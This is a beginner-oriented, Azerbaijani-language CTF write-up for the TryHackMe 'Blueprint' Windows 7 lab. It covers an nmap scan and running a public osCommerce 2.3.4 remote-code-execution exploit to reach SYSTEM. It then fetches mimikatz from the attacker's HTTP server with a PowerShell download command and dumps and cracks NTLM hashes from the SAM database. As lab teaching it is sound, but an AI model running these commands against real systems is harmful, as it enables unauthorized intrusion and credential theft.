# 🔵 TryHackMe — Blueprint Writeup (Tam İzahlı)

> **Çətinlik:** Asan  
> **OS:** Windows 7 Home Basic SP1  
> **Məqsəd 1:** `root.txt` faylını tap  
> **Məqsəd 2:** `Lab` istifadəçisinin NTLM hash-ını tap və crack et

---

## 📖 Bu Lab Haqqında

Blueprint — Windows 7 əməliyyat sistemi üzərində işləyən TryHackMe maşınıdır.  
Hücumun yolu: **osCommerce 2.3.4** adlı köhnə e-ticaret proqramındakı zəiflikdən istifadə edərək sisteme daxil olmaq, sonra **Mimikatz** ilə şifrə hash-larını çıxarmaqdır.

---

## 🧠 Pentesting Nədir? (Sıfırdan izah)

Pentesting — bir sistemi **icazəli şəkildə** sınaqdan keçirməkdir. Məqsəd: zəiflikləri tapmaq.

Addımlar həmişə belədir:
```
1. Reconnaissance  →  hədəf haqqında məlumat topla
2. Scanning        →  açıq portları, servisləri tap
3. Exploitation    →  zəifliyi istifadə et
4. Post-Exploit    →  sistemdə nə var? şifrələr, fayllar?
```

---

## 📁 Addım 0: İş Qovluğu Yarat

```bash
mkdir ~/Desktop/blueprint && cd ~/Desktop/blueprint
```

**Niyə?**  
Hər lab üçün ayrı qovluq açmaq yaxşı vərdişdir. Bütün fayllar (nmap nəticəsi, yüklədiklərimiz) bir yerdə olsun.

---

## 🔍 Addım 1: Nmap ilə Skan

### Nmap nədir?

**Nmap** — şəbəkə skanı üçün istifadə edilən alətdir.  
Bir IP ünvanına "sən hansı portları açıqsan, orada hansı proqram işləyir?" deyə soruşur.

**Port nədir?**  
Düşün ki bir bina var. Binanın hər qapısı bir portdur.
- 80-ci qapı = HTTP (veb sayt)
- 443-cü qapı = HTTPS (şifrəli veb sayt)
- 445-ci qapı = SMB (Windows fayl paylaşımı)
- 3306-cı qapı = MySQL (verilənlər bazası)

### Əmr:

```bash
nmap -v -A -oN nmap-scan.txt 10.81.182.113
```

**Hər flag nə deməkdir?**

| Flag | Mənası |
|------|--------|
| `-v` | Verbose — işləyərkən nəticələri göstər, gözləmə |
| `-A` | Aggressive — versiyanı tap, OS-i tap, scriptləri işlət, traceroute et |
| `-oN nmap-scan.txt` | Nəticəni fayla yaz (Normal format) |

> `-A` flaqı eyni anda `-sV` (versiyanı tap) + `-sC` (scriptlər) + `-O` (OS tap) + `--traceroute` işlədir. Hamısını bir yerdə istifadə etmək üçün rahatdır.

### Nəticə:

```
80/tcp    open  http     Microsoft IIS httpd 7.5
443/tcp   open  ssl/http Apache 2.4.23 + PHP/5.6.28
445/tcp   open  msrpc    Windows 7 SMB
3306/tcp  open  mysql    MariaDB
8080/tcp  open  http     Apache 2.4.23
```

Əlavə olaraq nmap bunu da göstərdi:

```
| http-ls: Volume /
|   oscommerce-2.3.4/
|   oscommerce-2.3.4/catalog/
```

### Nəticəni necə oxumalıyıq?

Vacib məlumatlar:
- **Windows 7 Home SP1** — çox köhnə, 2020-ci ildə dəstəyi kəsildi
- **Apache 2.4.23** — 443 və 8080-də işləyir (2016-cı il versiyası!)
- **osCommerce 2.3.4** — onlayn mağaza proqramı, qovluq adından versiyanı bildik
- **PHP 5.6.28** — 2018-ci ildə dəstəyi kəsildi
- **SMB port 445** — Windows 7 + SMB = EternalBlue ola bilər (bonus)

> 💡 **Niyə versiyanı bilmək vacibdir?**  
> Hər proqramın hər versiyasında müəyyən zəifliklər var.  
> `osCommerce 2.3.4` → Google: "oscommerce 2.3.4 exploit" → dərhal tapılır.  
> Exploit-DB-də **EDB-ID 50128** kimi qeydə alınıb.

---

## 🌐 Addım 2: osCommerce Zəifliyini Anla

### osCommerce nədir?

osCommerce — açıq mənbəli onlayn mağaza proqramıdır. Köhnə versiyalarda ciddi zəifliklər var.

### Zəiflik necə işləyir?

osCommerce qurularkən `/install/` qovluğu yaradılır.  
**Qurulum bitdikdən sonra bu qovluq mütləq silinməlidir.**  
Əgər silinməyibsə — biz qurulum prosesini yenidən işlədə bilərik.

Exploit bundan istifadə edir:
```
/install/index.php → db_database parametrinə PHP kodu yeridilir
                   → configure.php faylına yazılır
                   → Server həmin PHP kodunu icra edir
                   → Biz sistemə əmr göndərə bilirik (RCE)
```

**RCE (Remote Code Execution)** = uzaqdan kod icra etmək = serverə öz əmrlərimizi göndərə bilərik.

### searchsploit ilə exploit tap:

```bash
searchsploit osCommerce 2.3.4
```

**searchsploit nədir?**  
Exploit-DB saytının offline versiyasıdır. Kali Linux-da hazır gəlir.  
İnternet olmadan da istifadə edə bilərsən.

Nəticə:
```
osCommerce 2.3.4.1 - Remote Code Execution (2)   php/webapps/50128.py
```

Bizə lazım olan: **50128** — RCE exploit-i.

Exploit-in tam yolunu tap:

```bash
searchsploit 50128 -p
```

**`-p` flag nə edir?**  
`-p` = path — exploit-in diskdəki tam yolunu göstərir.

Nəticə:
```
Path: /usr/share/exploitdb/exploits/php/webapps/50128.py
```

---

## ⚔️ Addım 3: Exploit-i İşlət

```bash
python3 /usr/share/exploitdb/exploits/php/webapps/50128.py http://10.81.182.113:8080/oscommerce-2.3.4/catalog/
```

**Niyə `http://` və port `8080`?**  
443-də SSL sertifikatı köhnədir (2009-cu il), Python onu qəbul etməyə bilər.  
8080-də eyni osCommerce var, amma plain HTTP ilə işləyir — daha etibarlıdır.

**Niyə `/oscommerce-2.3.4/catalog/` əlavə etdik?**  
Exploit osCommerce-in harada olduğunu bilməlidir. Nmap skanından bu yolu gördük.

Nəticə:
```
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system

RCE_SHELL$
```

### Bu nə deməkdir?

- `Install directory still available` → `/install/` qovluğu silinməyib, zəiflik mövcuddur
- `User: nt authority\system` → **Biz artıq sistemdəyik və SYSTEM səlahiyyətindəyik!**

**NT AUTHORITY\SYSTEM** — Windows-da ən yüksək səlahiyyətdir.  
Linux-dakı `root` nədirsə, Windows-da `SYSTEM`-dir.  
Sistemin tam sahibiyik.

> 💡 Bu, əslində böyük konfiqurasiya səhvidir — veb server heç vaxt SYSTEM kimi işləməməlidir.  
> Normal halda veb server ayrıca aşağı səlahiyyətli istifadəçi kimi işləyir.

---

## 🚩 Addım 4: root.txt Faylını Tap

CTF-lərdə flag adətən Administrator-un Desktop-unda olur.

```bash
dir C:\users\administrator\desktop
```

**`dir` nədir?**  
Windows-un `ls` əmridir — qovluğun içindəkiləri göstərir.

Nəticə:
```
11/27/2019  07:15 PM    37 root.txt.txt
```

Faylı oxu:

```bash
more C:\users\administrator\desktop\root.txt.txt
```

**`more` nədir?**  
Windows-da faylın içindəkiləri ekrana çap edir. Linux-dakı `cat` kimidir.

Nəticə:
```
THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

**İlk flag tapıldı! ✅**

---

## 🔑 Addım 5: Mimikatz ilə Hash Dump et

### Mimikatz nədir?

**Mimikatz** — Windows-da şifrələri və hash-ları yaddaşdan çıxarmaq üçün istifadə edilən alətdir.  
2011-ci ildə Benjamin Delpy tərəfindən yazılıb.  
Windows SAM verilənlər bazasından NTLM hash-larını çıxara bilir.

### Hash nədir?

Windows istifadəçilərin şifrələrini düz saxlamır — **hash** şəklində saxlayır.  
Hash = şifrənin şifrəli versiyası (birtərəfli funksiya).

```
Şifrə:      Password123
NTLM Hash:  8846f7eaee8fb117ad06bdd830b7586c
```

Hash-dan orijinal şifrəyə birbaşa keçmək olmaz.  
Amma **crackstation.net** kimi saytlar milyardlarla hash-şifrə cütlüyünü bazada saxlayır — sadə şifrələr dərhal tapılır.

### Plan: Kali-dən Mimikatz-ı hədəfə yüklə

**Addım 1 — Kali-də yeni terminal aç** (RCE_SHELL-i bağlama):

```bash
cd ~/Desktop/blueprint
python3 -m http.server 80
```

**`python3 -m http.server 80` nə edir?**  
Kali maşınında sadə HTTP server açır. Port 80-də işləyir.  
İndi hər kəs (o cümlədən hədəf maşın) `http://sənin_IP-n/` ünvanına girəndə bu qovluqdakı faylları görə bilər.

**Niyə buna ehtiyac var?**  
RCE_SHELL vasitəsilə hədəf maşına fayl yükləyə bilmirik birbaşa.  
Amma hədəf maşına deyə bilərik: "get gəl mənim serverimə qoşul, faylı özün yüklə."

**Addım 2 — Mimikatz-ı Kali-yə yüklə:**

Mimikatz-ı GitHub-dan endir, `~/Desktop/blueprint/` qovluğuna qoy.  
(Artıq Kali-nin tools qovluğunda varsa, oradan kopyala.)

```bash
cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ~/Desktop/blueprint/
```

**Addım 3 — RCE_SHELL-də Mimikatz-ı hədəfə yüklə:**

```bash
powershell (New-Object System.Net.WebClient).DownloadFile("http://192.168.138.73/mimikatz.exe", "mimikatz.exe")
```

**Bu əmri parçalayaq:**

| Hissə | Mənası |
|-------|--------|
| `powershell` | Windows PowerShell-i çağır |
| `New-Object System.Net.WebClient` | Fayl yükləmək üçün .NET obyekti yarat |
| `.DownloadFile(...)` | Faylı yüklə |
| `"http://192.168.138.73/mimikatz.exe"` | Kali-mizdəki HTTP serverdən al (192.168.138.73 = Kali IP-n) |
| `"mimikatz.exe"` | Hədəf maşında bu adla saxla (hazırki qovluqda) |

> 💡 `192.168.138.73` əvəzinə sənin Kali VPN IP-ni yaz.  
> Bunu tapmaq üçün Kali terminalında: `ip addr show tun0`

**Addım 4 — Mimikatz-ı işlət:**

```bash
mimikatz "lsadump::sam" exit
```

**Bu əmri parçalayaq:**

| Hissə | Mənası |
|-------|--------|
| `mimikatz` | Mimikatz proqramını başlat |
| `"lsadump::sam"` | SAM verilənlər bazasından hash-ları dump et |
| `exit` | Mimikatz-dan çıx |

**`lsadump::sam` nə edir?**  
SAM = Security Account Manager = Windows-un şifrə bazası.  
Bu əmr SAM faylını oxuyur və bütün istifadəçilərin NTLM hash-larını çıxarır.

Nəticə:
```
RID : 000001f4 (500)
User : Administrator
Hash NTLM: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

RID : 000001f5 (501)
User : Guest

RID : 000003e8 (1000)
User : Lab
Hash NTLM: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

**RID nədir?**
- 500 = həmişə Administrator
- 501 = həmişə Guest
- 1000+ = normal istifadəçilər (bizə `Lab` lazımdır)

**Lab istifadəçisinin NTLM hash-ını kopyala.**

---

## 🔓 Addım 6: Hash-ı Crack Et

### Metod: crackstation.net (Online)

1. [crackstation.net](https://crackstation.net) aç
2. `Lab` istifadəçisinin NTLM hash-ını yapışdır
3. "I'm not a robot" işarəsi qoy
4. "Crack Hashes" düyməsini bas

Nəticə:
```
Hash                              Type    Result
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  NTLM    xxxxxxxxx
```

**İkinci sual cavablandı! ✅**

---

## 📋 Nəticə

| Tapılan | Dəyər |
|---------|-------|
| root.txt | `THM{...}` — Administrator Desktop-unda |
| Lab NTLM hash | Mimikatz ilə SAM-dan çıxarıldı |
| Lab şifrəsi | crackstation.net ilə crack edildi |

---

## 📚 Öyrəndiklərimizi Ümumiləşdirək

| Addım | Nə etdik | Niyə etdik |
|-------|----------|------------|
| Workspace yarat | `mkdir blueprint` | Faylları nizamlı saxlamaq üçün |
| Nmap `-A` skanı | Portları, versiyaları tapdıq | Hədəfi tanımaq üçün |
| searchsploit | osCommerce exploit-i tapdıq | Hansı exploit işlədəcəyimizi bilmək üçün |
| 50128.py işlətdik | RCE_SHELL əldə etdik | Sistemə daxil olmaq üçün |
| `dir` + `more` | root.txt oxudq | Birinci flag üçün |
| HTTP server açdıq | Mimikatz-ı hədəfə yükləmək üçün | Fayl transfer üçün |
| `lsadump::sam` | Hash-ları çıxardıq | Lab şifrəsini tapmaq üçün |
| crackstation.net | Hash crack etdik | İkinci sual üçün |

---

## 🛠️ İstifadə Edilən Alətlər

| Alət | Nə üçün | Qeyd |
|------|---------|------|
| `nmap` | Port skanı | Kali-də hazır |
| `searchsploit` | Exploit tapmaq | Kali-də hazır (Exploit-DB offline) |
| `python3 50128.py` | osCommerce RCE | Exploit-DB-dən |
| `python3 -m http.server` | Fayl paylaşımı | Python built-in |
| `mimikatz` | Hash dump | Windows aləti |
| crackstation.net | Hash crack | Online, pulsuz |

---

## 💡 Yeni Başlayanlar Üçün Qeydlər

**"Bunu hardan bildim?"** — cavab:

1. **Nmap nəticəsindəki versiyanı gör** → `osCommerce 2.3.4`
2. **searchsploit-da axtar** → `searchsploit oscommerce 2.3.4`
3. **Exploit tap, işlət**
4. **SYSTEM oldun** → artıq hər şey mümkündür
5. **Mimikatz** → Windows-da hash dump üçün standart alətdir

**Ən vacib vərdiş:**  
Nmap nəticəsini gördükdə **hər versiyanı** ayrıca Google-da axtar.  
`Apache 2.4.23 exploit`, `PHP 5.6.28 exploit`, `osCommerce 2.3.4 exploit` — hamısını yoxla.

---

*Writeup — sıfırdan öyrənən üçün yazıldı 🎯*
